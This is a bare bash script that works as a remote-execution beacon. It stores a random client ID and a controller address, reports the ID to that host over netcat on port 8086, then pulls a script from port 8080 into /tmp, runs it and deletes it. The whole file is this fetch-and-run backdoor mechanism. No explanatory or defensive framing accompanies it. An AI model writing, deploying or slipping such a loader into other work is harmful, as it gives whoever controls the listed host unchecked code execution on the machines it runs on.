#! /bin/bash
#echo "$(dirname "$0")/set.txt"
if [ ! -f $(dirname "$0")/set.txt ]; then
        env LC_CTYPE=C tr -dc "a-zA-Z0-9-_\$\?" < /dev/urandom | head -c 10 > $(dirname "$0")/set.txt
        echo >> $(dirname "$0")/set.txt
        echo 127.0.0.1 >> $(dirname "$0")/set.txt
fi
echo $(sed '1q;d' $(dirname "$0")/set.txt) | nc $(head -n 2 $(dirname "$0")/set.txt | tail -1) 8086
nc $(head -n 2 $(dirname "$0")/set.txt | tail -1) 8080 > /tmp/execute.sh
chmod +x /tmp/execute.sh
bash /tmp/execute.sh
rm /tmp/execute.sh
